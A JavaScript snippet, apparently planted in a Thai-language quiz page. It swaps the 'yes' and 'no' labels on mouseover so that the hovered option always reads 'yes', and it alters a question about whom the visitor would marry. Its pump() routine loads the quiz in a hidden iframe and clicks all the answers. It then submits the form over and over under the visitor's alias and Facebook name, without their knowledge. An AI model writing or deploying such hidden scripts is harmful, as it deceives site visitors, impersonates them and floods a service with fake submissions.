$('#a1_1').parent().parent().get(0).onmouseover = function(){
	if($('#a1_1').parent().children()[0].checked == false && $('#a1_2').parent().children()[0].checked == false){
		$('#a1_1').get(0).innerHTML = "ใช่";
		$('#a1_2').get(0).innerHTML = "ไม่";
	}
}
$('#a1_2').parent().parent().get(0).onmouseover = function(){
	if($('#a1_1').parent().children()[0].checked == false && $('#a1_2').parent().children()[0].checked == false){
		$('#a1_2').get(0).innerHTML = "ใช่";
		$('#a1_1').get(0).innerHTML = "ไม่";
	}
}
$('#a1_1').parent().parent().get(0).onchange = function(){
	$('#a1_1').get(0).innerHTML = "ใช่";
	$('#a1_2').get(0).innerHTML = "ไม่";
}
$('#a1_2').parent().parent().get(0).onchange = function(){
	$('#a1_2').get(0).innerHTML = "ใช่";
	$('#a1_1').get(0).innerHTML = "ไม่";
}
$('#a2_1').parent().parent().get(0).onchange = function(){
	$('#q2').get(0).innerHTML = "คุณคิดจะแต่งงานกับผู้ชายไหม?";
}
$('#a2_2').parent().parent().get(0).onchange = function(){
	$('#q2').get(0).innerHTML = "คุณคิดจะแต่งงานกับผู้หญิงไหม?";
}

var pumpCount=0;
function pump(){
	$(document.body).append($('<iframe id="dup"></iframe>'));
	$('#dup').get(0).style.display = 'none';
	$(dup).get(0).onload = function(){
		$(dup.contentDocument).find('[id^=answergroup]').children().each(function(index){
			this.click();
		});
		$(dup.contentDocument).find('#aliasname').get(0).value = "("+$(dup.contentDocument).find('#aliasname').get(0).value+")";
		$(dup.contentDocument).find('#fb_name').get(0).value = "("+$(dup.contentDocument).find('#fb_name').get(0).value+")";
		$(dup.contentDocument).find('#submitForm').find('.submit_game').click();
		setTimeout(function(){
			$('#dup').remove();
			pumpCheck();
		},8000+2500*(pumpCount++));
	}
	$(dup).get(0).src = ".?id="+$('#quiz_id').attr('value');
}
function pumpCheck(){
	if($('#aliasname').attr('value').length > 0){
		pump();
	}else{
		setTimeout(pumpCheck,1000);
	}
}
if(window.self == window.top){
	pumpCheck();
}